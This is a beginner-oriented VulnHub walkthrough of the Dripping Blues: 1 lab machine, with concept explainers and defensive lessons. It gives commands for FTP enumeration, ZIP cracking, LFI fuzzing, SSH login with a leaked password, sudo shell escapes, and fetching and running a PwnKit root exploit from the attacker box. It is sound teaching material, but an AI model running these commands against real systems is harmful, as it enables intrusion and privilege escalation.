# Dripping Blues: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational boot2root walkthrough for students. Everything here is performed on
> an isolated lab network against a machine you intentionally downloaded to attack.
> Never point these techniques at systems you do not own or have written permission to test.

| Field | Value |
| --- | --- |
| **Machine** | Dripping Blues: 1 |
| **Difficulty** | **3 — Easy** (stated: *Easy*) |
| **Author** | tasiyanci |
| **Released** | 19 September 2021 |
| **VulnHub Entry** | [https://vulnhub.com/entry/dripping-blues-1,744/](https://vulnhub.com/entry/dripping-blues-1,744/) |
| **Download** | [https://vulnhub.com/entry/dripping-blues-1,744/#download](https://vulnhub.com/entry/dripping-blues-1,744/#download) (mirror: `https://download.vulnhub.com/drippingblues/drippingblues.ova`, ~2.8 GB) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) on a host-only network |
| **Target OS** | Linux (Ubuntu 20.04, Apache + PHP) |

> **Note on the URL:** the VulnHub entry for *Dripping Blues: 1* is **744**, not
> 657 (657 is a different tasiyanci machine, "Gigachad: 1"). Use
> `https://vulnhub.com/entry/dripping-blues-1,744/`.
>
> **Note:** exact IPs, filenames, passwords, and flags **vary by build**. Where you
> see `192.168.56.101`, substitute whatever address *your* target gets from DHCP.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find a target on an isolated lab subnet with `arp-scan` / `netdiscover`.
- How to enumerate anonymous FTP and pull down an interesting archive.
- How to crack a password-protected ZIP with `zip2john` + `john` (a *real* crypto crack).
- How to read `robots.txt` for hidden paths and follow a hint chain.
- How to fuzz a web parameter with `ffuf` to discover an **LFI** (Local File Inclusion).
- How to use LFI to read files outside the web root (`/etc/dripispowerful.html`).
- How to turn a leaked password into SSH access.
- How to escalate to root by exploiting **PwnKit** (CVE-2021-4034) in `polkit`.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running, be able to
import an OVA, and know your way around a Linux shell.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network.

Confirm your own address so you know the subnet.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP>
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** the host-only adapter (`eth0`) sits on `192.168.56.x`; the target
> VM lands on the **same** subnet.

Sweep the subnet for live hosts:


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo netdiscover -r 192.168.56.0/24
# or:
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   (Kali)
192.168.56.101  (target)
```

> **How to read it:** each line is a live host. The unknown MAC that is not your Kali
> box is the target — here `192.168.56.101`.

**Target IP:** `192.168.56.101`

![Finding the target with netdiscover](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 21,22,80 -oA scans/services 192.168.56.101
```


> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0 0    ... respectmydrip.zip
22/tcp open  ssh     OpenSSH 8.x (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Dripping Blues
```

> **How to read it:**
> - **21/tcp FTP** and the Nmap script output `Anonymous FTP login allowed` — we can log
>   in with the username `anonymous` and no password.
> - **22/tcp SSH** — eventual login target.
> - **80/tcp HTTP** — an Apache web app to explore.
> The FTP listing already shows `respectmydrip.zip`, which is worth grabbing.

### 2.1 Anonymous FTP

```bash
ftp 192.168.56.101
# Name: anonymous
# Password: (just press Enter)
ftp> ls
ftp> get respectmydrip.zip
ftp> bye
```

```text
-rw-r--r--  1 0 0   ...   respectmydrip.zip
```

> **Why it works:** the FTP server grants access to the `anonymous` account with no
> authentication. Anything reachable this way is public to the whole network — already a
> misconfiguration.

### 2.2 Crack the ZIP password

The archive is password-protected. First extract the hash, then crack it with John.


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
zip2john respectmydrip.zip > respectmydrip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt respectmydrip.hash
```

```text
respectmydrip.zip/respectmydrip.txt:072528035  (respectmydrip.txt)
```

> **Why it works:** `zip2john` converts the ZIP's encryption into a hash format John can
> test. `john` then hashes each word in `rockyou.txt` and compares — this is genuine
> offline password cracking against the ZIP's weak crypto.

Unzip with the recovered password `072528035`:

```bash
unzip respectmydrip.zip
cat respectmydrip.txt
ls -la
```

```text
# respectmydrip.txt -> a hint: "you know ... the drip ..."
# secret.zip        -> a second archive; its own password is a red herring
```

> **Why it works:** the extracted text is a hint (remember the word *drip*), and the
> `secret.zip` is a decoy — both are typical CTF breadcrumbs. Do not waste hours on the
> decoy.

![Cracking and unpacking the ZIP](images/03-zip.png)

### 2.3 The web app and `robots.txt`

```bash
curl -s http://192.168.56.101/robots.txt
curl -s http://192.168.56.101/index.php
```

```text
User-agent: *
Disallow: /dripisreal.txt
Disallow: /etc/dripispowerful.html

# index.php body:
#   driftingblues is hacked again so it's now called drippingblues :D
#   by travisscott & thugger
```

> **Why it works:** `robots.txt` is meant to tell crawlers what *not* to index, but it
> leaks the existence of two paths. `index.php` leaks two usernames: **travisscott** and
> **thugger**. Note the `/etc/dripispowerful.html` entry — a path *outside* the web root,
> which strongly suggests a file-inclusion bug.

Read the two hinted files:

```bash
curl -s http://192.168.56.101/dripisreal.txt
```

```text
# dripisreal.txt: a riddle about ssh password ... "focus on the drip"
```

![robots.txt and the leaked usernames](images/02-enum.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Fuzz for a hidden parameter (LFI)

`index.php` takes a parameter that is not shown anywhere. Fuzz for it by passing a known
file path as the value and looking for responses that differ from the "normal" size.


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
ffuf -ic -c -r -w /usr/share/wordlists/dirb/common.txt \
     -u 'http://192.168.56.101/index.php?FUZZ=/etc/passwd' -fs 138
```

```text
drip                    [Status: 200, Size: 3987, Words: 708]
```

> **Why it works:** we replace the parameter **name** with `FUZZ`. When the correct name
> (`drip`) is used, the PHP code includes the file we asked for (`/etc/passwd`) and the
> page *size changes* from the baseline (138 bytes). `-fs 138` filters out the normal
> responses so only the anomaly shows.

> **Why it works:** `include($_GET['drip'])` without validation is a **Local File
> Inclusion** bug — the app will happily read any file the web server can read.

### 3.2 Exploit the LFI to read the secret file

Remember the path from `robots.txt` that lived outside the web root:

```bash
curl -s 'http://192.168.56.101/index.php?drip=/etc/dripispowerful.html'
```

```text
password is:
imdrippinbiatch
```

> **Why it works:** LFI reads files **relative to the server's filesystem**, not the web
> root. `/etc/dripispowerful.html` sits in `/etc/`, which is normally unreachable via a
> URL — but `include()` does not care. The file contains a plaintext password.

### 3.3 Use the password to get SSH access

We have usernames **travisscott** and **thugger** and the password **imdrippinbiatch**.

```bash
ssh thugger@192.168.56.101
# password: imdrippinbiatch
```

```text
thugger@drippingblues:~$ id
uid=1001(thugger) gid=1001(thugger) groups=1001(thugger)
thugger@drippingblues:~$ cat ~/user.txt
5C50FC503A2ABE93B4C5EE3425496521
```

> **Why it works:** the leaked password happens to belong to **thugger**. Password reuse
> between a config/hint file and a real account is exactly the kind of sloppiness this box
> is designed to teach you to spot.

![SSH as thugger and the user flag](images/04-shell-thugger.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

### 4.1 Enumerate the system


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
uname -a
cat /etc/os-release
ps -ef | grep -i polkit
sudo -l
```

```text
Linux drippingblues 5.x.x-generic ... x86_64
NAME="Ubuntu"  VERSION="20.04 ... "
root ... /usr/lib/policykit-1/polkitd --no-debug
# sudo -l: (you have no password / no sudo rights) -> no easy win here
```

> **How to read it:** there is no obvious `sudo` misconfiguration, but the box is **Ubuntu
> 20.04** running `polkitd`. Ubuntu 20.04 ships a vulnerable `pkexec` — this points us at
> **PwnKit**.

### 4.2 Confirm the vulnerability

**PwnKit (CVE-2021-4034)** is a local privilege-escalation bug in `pkexec` (part of
polkit) present in essentially all mainstream Linux distributions since 2009. It lets any
local user become root without knowing a password. Ubuntu 20.04 was affected.

You can confirm automatically with an enumeration script:

```bash
# On Kali, download linpeas and serve it
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8000
```

```bash
# On the target (thugger):
cd /tmp
wget http://192.168.56.10:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | grep -i -A2 pwnkit
```

```text
[+] Ubuntu 20.04 ... vulnerable to CVE-2021-4034 (PwnKit)
```

> **Why it works:** `pkexec` mishandles `argc==0`, letting an attacker control the
> environment it uses to find the `pkexec` binary. This allows loading an attacker-supplied
> shared object as root. It is a **local** bug — you already need a foothold.

### 4.3 Exploit PwnKit for root

Download a public PwnKit exploit (`cve-2021-4034.py` or the compiled `PwnKit` binary) to
the target and run it:

```bash
# On Kali (serve it)
cd /tmp
python3 -m http.server 8000
```

```bash
# On the target (thugger):
cd /tmp
wget http://192.168.56.10:8000/cve-2021-4034.py
python3 cve-2021-4034.py
```

```text
pkexec --version ...
# whoami
root
```

> **Why it works:** the exploit copies the public `pkexec` path into a controlled
> location and forces it to load `pwnkit.so` when it runs as root, spawning a root shell.
> No password is needed — the bug is in the program itself.

A common prebuilt variant also drops you straight into a root shell (`./PwnKit`).

### 4.4 The root flag

```bash
id
ls -la /root
cat /root/root.txt
```

```text
uid=0(root) gid=0(root) groups=0(root),1001(thugger)
78CE377EF7F10FF0EDCA63DD60EE63B8
```

> **Why it works:** once we are UID 0, every file on the box — including `/root/root.txt`
> — is readable. Game over.

![Escalating to root with PwnKit](images/05-privesc-pwnkit.png)

![Reading the root flag](images/06-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous FTP enabled | Port 21 (vsftpd) | Unauthenticated download of `respectmydrip.zip` |
| 2 | Weak ZIP encryption password | `respectmydrip.zip` (`072528035`) | Cracked offline with John the Ripper |
| 3 | Information disclosure via `robots.txt` / `index.php` | Web root | Leaks paths + usernames (`travisscott`, `thugger`) |
| 4 | Local File Inclusion (LFI) | `index.php?drip=` | Reads `/etc/dripispowerful.html`, leaking an SSH password |
| 5 | Password reuse | SSH (`thugger`) | Leaked password gives interactive login |
| 6 | Unpatched `pkexec` (PwnKit, CVE-2021-4034) | Ubuntu 20.04 `polkit` | Local user escalates to root |

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP** and remove public archives from FTP storage; prefer SFTP.
- **Never rely on ZIP/archive passwords** — they are trivially crackable offline. Use real
  encryption (e.g. `age`, GPG) for sensitive bundles.
- **Sanitise file-inclusion input.** Never pass user input straight to `include`/`require`;
  use an allowlist of permitted files or template IDs.
- **Do not leak paths or usernames** in `robots.txt` or page source. Remove leftover
  hint/testing files (`dripisreal.txt`, `dripispowerful.html`).
- **Patch promptly:** Ubuntu 20.04 needed the PwnKit fix. Track CVEs for `polkit`, and use
  unattended-upgrades.
- **Detection:** monitor FTP anonymous logins, unusual file reads via the web app, and
  `pkexec` executions. Alert on outbound connections from a web server.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: [Dripping Blues: 1](https://vulnhub.com/entry/dripping-blues-1,744/)
- Community writeups consulted:
  - [DrippingBlues-1 writeup — Tanveer Abdulaziz](https://firerey12.github.io/vulnhub/dripping-blues-1)
  - [Vulnhub Drippingblues — V4ler1an](https://www.v4ler1an.com/2023/11/vulnhub_drippingblues/)
  - [HackMyVm Drippingblues Walkthrough](http://www.vxer.cn/2021/09/24/hackmyvm-drippingblues-walkthrough/)
  - [Drippingblues — Kerszi Blog](https://kerszl.github.io/hacking/walkthrough/drippingblues/)
- Vendor advisories / docs:
  - [PwnKit — CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)
  - [NVD — CVE-2021-4034](https://nvd.nist.gov/vuln/detail/CVE-2021-4034)
  - [Polkit exploit PoC](https://github.com/Almorabea/Polkit-exploit)
  - [GTFOBins](https://gtfobins.github.io/)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with netdiscover / arp-scan
- [ ] `images/02-enum.png` — Nmap ports 21/22/80 + anonymous FTP listing
- [ ] `images/03-zip.png` — cracking the ZIP password with John
- [ ] `images/04-shell-thugger.png` — SSH as `thugger` + user flag
- [ ] `images/05-privesc-pwnkit.png` — running the PwnKit exploit
- [ ] `images/06-root-flag.png` — reading `/root/root.txt`
- [ ] `images/07-robots.png` — `robots.txt` and the LFI parameter fuzz (optional)
- [ ] `images/08-lfi.png` — reading `/etc/dripispowerful.html` via LFI (optional)

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
